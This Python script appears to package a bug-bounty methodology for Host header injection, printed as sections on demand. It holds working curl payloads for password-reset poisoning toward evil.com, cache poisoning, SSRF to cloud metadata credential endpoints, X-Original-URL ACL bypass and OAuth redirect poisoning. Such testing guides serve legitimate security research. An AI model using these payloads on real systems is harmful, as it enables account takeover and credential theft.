#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-host-header

Skill: HUNT-HOST-HEADER — Host Header Injection
Desc : Hunt Host Header Injection — password reset poisoning → ATO, web cache poisoning via unkeyed Host/X-Forwarded-Host, routing-based SSRF (Host picks upstream → cloud metadata/internal services), path-override SSRF/ACL-bypass (X-Original-URL/X-Rewrite-URL), OAuth redirect_uri/issuer poisoning, and absolute-URL link poisoning in emails. High to Critical when it reaches ATO or mass cache poisoning. Built on public Host-header research (PortSwigger 'Practical web cache poisoning' + James Kettle, and the classic password-reset-poisoning class). Use on any forgot-password flow, CDN/reverse-proxy-fronted app, OAuth/OIDC endpoint, or absolute-URL-in-email feature.

Run:  python claude-bughunter-hunt-host-header.py --help
      python claude-bughunter-hunt-host-header.py --list
      python claude-bughunter-hunt-host-header.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-host-header'
TITLE = 'HUNT-HOST-HEADER — Host Header Injection'
DESCRIPTION = "Hunt Host Header Injection — password reset poisoning → ATO, web cache poisoning via unkeyed Host/X-Forwarded-Host, routing-based SSRF (Host picks upstream → cloud metadata/internal services), path-override SSRF/ACL-bypass (X-Original-URL/X-Rewrite-URL), OAuth redirect_uri/issuer poisoning, and absolute-URL link poisoning in emails. High to Critical when it reaches ATO or mass cache poisoning. Built on public Host-header research (PortSwigger 'Practical web cache poisoning' + James Kettle, and the classic password-reset-poisoning class). Use on any forgot-password flow, CDN/reverse-proxy-fronted app, OAuth/OIDC endpoint, or absolute-URL-in-email feature."

PAYLOADS = {
    'main': ["name: hunt-host-header", "description: \"Hunt Host Header Injection \u2014 password reset poisoning \u2192 ATO, web cache poisoning via unkeyed Host/X-Forwarded-Host, routing-based SSRF (Host picks upstream \u2192 cloud metadata/internal services), path-override SSRF/ACL-bypass (X-Original-URL/X-Rewrite-URL), OAuth redirect_uri/issuer poisoning, and absolute-URL link poisoning in emails. High to Critical when it reaches ATO or mass cache poisoning. Built on public Host-header research (PortSwigger 'Practical web cache poisoning' + James Kettle, and the classic password-reset-poisoning class). Use on any forgot-password flow, CDN/reverse-proxy-fronted app, OAuth/OIDC endpoint, or absolute-URL-in-email feature.\"", "sources: portswigger_research, hackerone_public", "report_count: 16"],
    'hunt-host-header-host-header-injection': [],
    'grounding-provenance': ["This skill is built from the public Host-header attack literature, not invented payloads.", "Cite the *technique source* in your report, never a fabricated ID:", "- **Password-reset poisoning class** \u2014 the canonical write-up is Skelet's/Detectify-era", "\"Practical HTTP Host header attacks\" (the Django `request.get_host()` \u2192 password-reset-link", "case). Many frameworks built the reset URL from the request Host with no `ALLOWED_HOSTS`-style", "allowlist. Cite the framework + the reflected-Host behaviour you actually observed.", "- **Web cache poisoning via unkeyed Host / X-Forwarded-Host** \u2014 PortSwigger Research,", "James Kettle, \"Practical Web Cache Poisoning\" (2018) and \"Web Cache Entanglement\" (2020).", "These define unkeyed-input poisoning, which is the mechanism behind X-Forwarded-Host poisoning.", "- **Routing-based SSRF** \u2014 PortSwigger Research, \"Cracking the lens\" / routing-based SSRF", "(Host header steers the front-end's upstream selection).", "When you write the report, name the exact behaviour you reproduced (reflected header, cache HIT", "on a fresh key, OOB hit from your Collaborator). Do **not** copy a CVE or H1 ID you have not", "verified \u2014 a missing citation is always better than a wrong one."],
    'crown-jewel-targets': ["Host header injection that reaches password reset links = Critical (ATO for any user).", "**Highest-value chains:**", "- **Password reset poisoning \u2192 ATO** \u2014 server builds the reset link from the request Host;", "attacker sets `Host: evil.com`; the victim's reset email points the token at the attacker \u2192", "token captured on click \u2192 full ATO. Pre-account-takeover variant: even the victim *requesting*", "their own reset leaks the token to evil.com.", "- **Web cache poisoning via unkeyed Host** \u2014 a CDN/reverse proxy caches a response that reflects", "an attacker `X-Forwarded-Host` into an absolute URL (script src, link, redirect) \u2192 poisoned", "entry served to every later visitor on that cache key \u2192 mass XSS/redirect/CSP bypass.", "- **Routing-based SSRF** \u2014 the front-end uses the *Host header itself* to pick the upstream;", "`Host: 169.254.169.254` (or an internal hostname) makes it forward your request to that target", "\u2192 cloud metadata / internal admin panels.", "- **Path-override SSRF / ACL bypass** \u2014 IIS/ASP.NET/Spring honour `X-Original-URL` /", "`X-Rewrite-URL` to override the routed path \u2192 reach `/admin` or internal endpoints the edge", "ACL thought it blocked. (Different layer from routing SSRF \u2014 see Phase 3.)", "- **OAuth/OIDC poisoning** \u2014 Host drives `redirect_uri` or the OIDC `issuer` / discovery doc \u2192", "auth-code or token theft \u2192 ATO."],
    'attack-surface-signals': ["Any password reset / forgot-password / email-verification / invite endpoint", "Any app behind CDN/reverse proxy (Cloudflare, Varnish, Fastly, Akamai, Nginx, HAProxy)", "OAuth/OIDC authorization + /.well-known/openid-configuration endpoints", "Absolute URLs constructed from request Host (set-password links, share links, webhooks)", "Email-sending endpoints (transactional mail, notifications)", "Reverse proxies that may route by Host (k8s ingress, service mesh, internal forward proxies)", "**Dangerous header candidates (unkeyed / trusted inputs):**", "Host                 X-Forwarded-Host      X-Host", "X-Forwarded-Server   X-HTTP-Host-Override  Forwarded", "X-Original-URL       X-Rewrite-URL         X-Override-URL   (path-override class)"],
    'step-by-step-hunting-methodology': [],
    'phase-1-password-reset-poisoning': ["```bash"],
    '1a-override-host-directly': ["curl -s -X POST https://$TARGET/forgot-password \\", "-H \"Host: evil.com\" \\", "-H \"Content-Type: application/json\" \\", "-d '{\"email\":\"your-test-account@target.com\"}'"],
    '1b-x-forwarded-host-behind-reverse-proxy-that-trusts-it': ["curl -s -X POST https://$TARGET/forgot-password \\", "-H \"Host: $TARGET\" \\", "-H \"X-Forwarded-Host: evil.com\" \\", "-d \"email=your-test-account@target.com\""],
    '1c-host-x-forwarded-host-combo-and-x-host': ["curl -s -X POST https://$TARGET/forgot-password \\", "-H \"Host: $TARGET\" -H \"X-Host: evil.com\" \\", "-d \"email=your-test-account@target.com\""],
    '1d-dual-host-host-override-smuggling-some-stacks-read-the-second-host': ["printf 'POST /forgot-password HTTP/1.1\\r\\nHost: %s\\r\\nHost: evil.com\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 33\\r\\nConnection: close\\r\\n\\r\\nemail=your-test-account@target.com' \"$TARGET\" \\"],
    '1e-absolute-url-injection-keep-real-host-append-attacker-host-so-the': [],
    'reset-link-becomes-https-target-evil-com-or-routes-the-token-out': ["curl -s -X POST https://$TARGET/forgot-password \\", "-H \"Host: $TARGET.evil.com\" -d \"email=your-test-account@target.com\""],
    '1f-trailing-port-userinfo-confusion-parsers-that-split-on-or': ["curl -s -X POST https://$TARGET/forgot-password \\", "-H \"Host: $TARGET:1@evil.com\" -d \"email=your-test-account@target.com\"", "**Confirm:** open the reset email *in your own test inbox* and read the link host. The token must", "appear under an attacker-controlled host (`evil.com`, `$TARGET.evil.com`, or a Collaborator", "domain) for this to be a real finding. **Use a Burp Collaborator domain as the injected host** so", "that when the victim clicks (or a preview-fetcher fetches), you capture the token out-of-band and", "have proof \u2014 see Validation."],
    'phase-2-web-cache-poisoning-via-host-x-forwarded-host': ["Mechanism: this is a **reflection** bug, not an OOB bug. The injected host must be *reflected into", "the response body* (an absolute URL, script `src`, `<link href>`, `<base href>`, redirect", "`Location`, or canonical/og:url) **and** that response must be **cached on a key you do not", "control**. No Collaborator callback is expected from the cache test itself \u2014 only later, if a", "victim's browser loads the poisoned absolute URL.", "```bash"],
    '2a-is-the-host-reflected-into-the-body': ["curl -s https://$TARGET/ \\", "-H \"Host: $TARGET\" -H \"X-Forwarded-Host: canary-$RANDOM.example\" \\"],
    '2b-is-the-response-cacheable-and-what-is-the-cache-key': ["curl -sI \"https://$TARGET/?cb=$RANDOM\" \\"],
    'look-for-x-cache-cf-cache-status-hit-nonzero-age-via-varnish-fastly-cloudfront': [],
    'check-vary-if-vary-does-not-include-x-forwarded-host-the-header-is-unkeyed-poisonable': [],
    '2c-prove-poisoning-poison-once-then-fetch-clean-no-injected-header-on-same-key': ["URL=\"https://$TARGET/?cb=poison$RANDOM\"", "curl -s \"$URL\" -H \"X-Forwarded-Host: evilcdn.example\" >/dev/null   # poison", "curl -s \"$URL\" | grep -i \"evilcdn.example\"                        # clean victim view \u2192 reflected = POISONED", "**False-positive killers (mandatory):**", "- A reflection that only ever appears for *your* request (because the header is **keyed**, e.g. in", "`Vary`, or the CDN includes Host in the key) is **not** poisoning \u2014 confirm 2c returns the", "payload on a request that *omits* the header.", "- `Age: 0` + `MISS` every time \u2192 no shared cache \u2192 no mass impact. Demote to self-only / Low.", "- Confirm blast radius from a **second machine / fresh egress IP / incognito** before claiming", "\"mass\". Cache scope is often per-edge / per-cookie / per-geo."],
    'phase-3-ssrf-via-host-header-two-distinct-mechanisms-do-not-conflate': ["These operate at different layers. Test them separately; they do **not** compose into one request.", "**(3A) Routing-based SSRF \u2014 the Host header selects the upstream.** The path goes on the", "**request line**, exactly as a normal request, because the metadata service / internal host serves", "plain HTTP and only sees the request line + headers you forward. `X-Original-URL` is irrelevant", "here \u2014 the EC2 IMDS ignores it.", "```bash"],
    'correct-routing-ssrf-probe-path-on-the-request-line-host-steers-the-proxy-upstream': ["curl -s \"https://$TARGET/latest/meta-data/\" -H \"Host: 169.254.169.254\"", "curl -s \"https://$TARGET/latest/meta-data/iam/security-credentials/\" -H \"Host: 169.254.169.254\""],
    'gcp-azure-equivalents-still-routing-via-host': ["curl -s \"https://$TARGET/computeMetadata/v1/\" \\", "-H \"Host: metadata.google.internal\" -H \"Metadata-Flavor: Google\"", "curl -s \"https://$TARGET/metadata/instance?api-version=2021-02-01\" \\", "-H \"Host: 169.254.169.254\" -H \"Metadata: true\""],
    'internal-hostname-port-routing': ["curl -s \"https://$TARGET/\" -H \"Host: localhost:6379\"   # Redis behind the proxy", "curl -s \"https://$TARGET/\" -H \"Host: internal-admin.svc.cluster.local\""],
    'blind-no-reflection-point-the-host-at-a-collaborator-subdomain-and-watch-for-the': [],
    'proxy-s-outbound-dns-http-lookup-that-proves-the-front-end-resolves-the-attacker-host': ["curl -s \"https://$TARGET/\" -H \"Host: $COLLAB\"", "**(3B) Path-override SSRF / ACL bypass \u2014 `X-Original-URL` / `X-Rewrite-URL`.** This is an", "IIS/ASP.NET/Spring-Cloud-Gateway feature where the app overrides the *routed path*. The real Host", "stays put; you are bypassing an **edge path ACL**, not steering an upstream. Keep the real Host.", "```bash"],
    'reach-an-internal-blocked-path-the-edge-thought-it-denied-real-host-stays': ["curl -s \"https://$TARGET/\" -H \"Host: $TARGET\" -H \"X-Original-URL: /admin\"", "curl -s \"https://$TARGET/\" -H \"Host: $TARGET\" -H \"X-Rewrite-URL: /internal/metrics\""],
    'diff-against-a-direct-get-admin-which-the-edge-blocks-a-different-status-body-proves-override': [],
    'phase-4-oauth-oidc-saml-poisoning': ["```bash"],
    'does-the-authorization-endpoint-build-redirect-uri-display-url-from-host': ["curl -s \"https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb\" \\", "-H \"Host: evil.com\" | grep -iE \"redirect|location|action=\""],
    'oidc-discovery-if-issuer-endpoints-reflect-host-the-whole-flow-can-be-re-pointed': ["curl -s \"https://$TARGET/.well-known/openid-configuration\" -H \"X-Forwarded-Host: evil.com\" \\", "**Confirm:** the auth code / token must actually be delivered to the attacker host (capture on", "Collaborator) \u2014 a reflected string alone is not ATO."],
    'phase-5-header-fuzzing-param-miner': ["Burp **Param Miner \u2192 Guess headers** is faster and finds unkeyed/cache-affecting headers the list", "below misses. Manual sweep:", "```bash", "HOST_HEADERS=(X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override \\", "Forwarded X-Original-URL X-Rewrite-URL X-Override-URL X-Forwarded-Scheme)", "for H in \"${HOST_HEADERS[@]}\"; do", "echo \"=== $H ===\"", "curl -s -I \"https://$TARGET/\" -H \"$H: canary-$RANDOM.example\" \\"],
    'chain-table': [],
    'validation-house-discipline': ["\u2705 **Password reset:** the token URL in **your own test account's email** uses an", "attacker-controlled host. Strongest proof = inject a **Collaborator** host and show the inbound", "HTTP hit carrying the token when the link is clicked/previewed (OOB capture).", "\u2705 **Cache poison:** a request that **omits** the injected header (fresh egress IP / incognito)", "still returns the attacker payload \u2192 shared-cache poisoning proven. Demote to Low if Vary-keyed or", "`MISS`/`Age:0` only.", "\u2705 **Routing SSRF:** real response body from `169.254.169.254` / internal host, **or** an OOB", "DNS/HTTP hit on your Collaborator from the front-end (blind case).", "\u2705 **Path-override:** status/body diff vs the edge-blocked direct request proves the override took.", "\u2705 **OAuth/OIDC:** the auth code / token is actually delivered to the attacker host (captured),", "not merely reflected.", "**Always rule out false positives:**", "- Reflected \u2260 cached. Cached-for-you \u2260 cached-for-others (check `Vary`, second IP).", "- A 200 echoing your Host string is not SSRF unless the *response content* came from the internal", "target or your Collaborator fired.", "- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host \u2014 reflected header in the", "HTTP response does not guarantee a poisoned *email*; verify the email body.", "**Severity:**", "- Reset \u2192 ATO for any user: Critical", "- Routing SSRF \u2192 cloud metadata creds: Critical (if creds usable) / High", "- Cache poisoning \u2192 mass XSS/redirect (shared key proven): High", "- Path-override \u2192 internal/admin reach: High", "- Reflected only, uncacheable, not in email, no internal reach: Low / informational"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()